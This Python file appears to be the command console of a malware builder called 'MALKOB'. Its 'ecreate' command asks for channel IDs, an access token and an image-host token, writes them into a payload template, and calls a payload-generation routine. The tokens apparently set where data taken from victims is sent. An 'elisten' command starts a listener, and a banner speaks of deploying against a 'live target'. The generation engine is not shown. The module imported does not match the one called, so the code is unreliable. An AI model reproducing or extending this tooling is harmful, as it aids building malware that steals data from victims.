import os
import time
import simple_colors
import MAKOB.MAKOB_Win32_Requests_engine

MALKOB_Current_user = os.getlogin()
MALKOB_Current_state = os.getcwd()

def MALKOB_requests_engine(MALKOB_valid_requests):
    if MALKOB_valid_requests == "ehelp":
        print(simple_colors.green("\n  MALKOB :: Command Reference", 'bold'))
        print(simple_colors.green("  ──────────────────────────────", 'bold'))
        print(simple_colors.green("  ehelp     "), simple_colors.magenta("- show help"))
        print(simple_colors.green("  ecreate   "), simple_colors.magenta("- generate payload"))
        print(simple_colors.green("  elisten   "), simple_colors.magenta("- begin listener"))
        print(simple_colors.green("  cls       "), simple_colors.magenta("- clear screen"))  

    if MALKOB_valid_requests == "ecreate":
        from simple_colors import green, magenta, black
        print(magenta("╔" + "═" * 66))
        print(magenta("║") + green("⚠️  WARNING: Critical Payload Configuration in Progress") + " " * 7 + magenta(""))
        print(magenta("╠" + "═" * 66))
        print(magenta("║") + black(" Ensure ALL fields are correctly inserted before proceeding.   ") + magenta(""))
        print(magenta("║") + black(" This will affect the ENTIRE generation pipeline.             ") + magenta(""))
        print(magenta("║") + black("                                                            ") + magenta(""))
        print(magenta("║") + black(" Always test payloads in a SAFE and ISOLATED environment.     ") + magenta(""))
        print(magenta("║") + black(" Deploying in a live target without testing may break ops.    ") + magenta(""))
        print(magenta("╚" + "═" * 66))

        MALKOB_ASSETS_ID = input(
            green("[" + magenta("MALKOB") + green("@") + magenta(f"{MALKOB_Current_user}") + green("]")) +
            magenta("::") + green("~") + magenta("/") + green("ID") + magenta(" > ")
        )
        MALKOB_ASSETS_CH_ID = input(
            green("[" + magenta("MALKOB") + green("@") + magenta(f"{MALKOB_Current_user}") + green("]")) +
            magenta("::") + green("~") + magenta("/") + green("CH_ID") + magenta(" > ")
        )
        MALKOB_ASSETS_PHT_CH_ID = input(
            green("[" + magenta("MALKOB") + green("@") + magenta(f"{MALKOB_Current_user}") + green("]")) +
            magenta("::") + green("~") + magenta("/") + green("PH_ID") + magenta(" > ")
        )
        MALKOB_ASSETS_TOKEN = input(
            green("[" + magenta("MALKOB") + green("@") + magenta(f"{MALKOB_Current_user}") + green("]")) +
            magenta("::") + green("~") + magenta("/") + green("TOKEN_ID") + magenta(" > ")
        )
        MALKOB_IMGBE_TOKEN = input(
            green("[" + magenta("MALKOB") + green("@") + magenta(f"{MALKOB_Current_user}") + green("]")) +
            magenta("::") + green("~") + magenta("/") + green("IMGB_TOKEN") + magenta(" > ")
        )

        os.chdir("..")
        os.chdir("MALKOB_LTEMPLATE")
        with open(f"MALKOB_{MALKOB_ASSETS_ID}.MALKOB", "+a") as MALKOB_CURRENT_CONFIG_ADJ:
            MALKOB_CURRENT_CONFIG_ADJ.writelines(f"\n{MALKOB_ASSETS_CH_ID}")
            MALKOB_CURRENT_CONFIG_ADJ.writelines(f"\n{MALKOB_ASSETS_PHT_CH_ID}")
            MALKOB_CURRENT_CONFIG_ADJ.writelines(f"\n{MALKOB_ASSETS_TOKEN}")    
            MALKOB_CURRENT_CONFIG_ADJ.writelines(f"\n{MALKOB_IMGBE_TOKEN}")
        os.chdir(MALKOB_Current_state)        

        MAKOB.MALKOB_Win32Linux_payload_generation_engine.MALKOB_TNT_NT = MALKOB_ASSETS_ID
        MAKOB.MALKOB_Win32Linux_payload_generation_engine.MALKOB_PAYLOAD_CARRIER(MALKOB_ASSETS_ID)   

    if MALKOB_valid_requests == "elisten":
        from simple_colors import green, magenta
        print(green("╚" + "═" * 64))    

    if MALKOB_valid_requests == "cls":
        os.system('cls')

    if MALKOB_valid_requests == "eclose":
        exit()
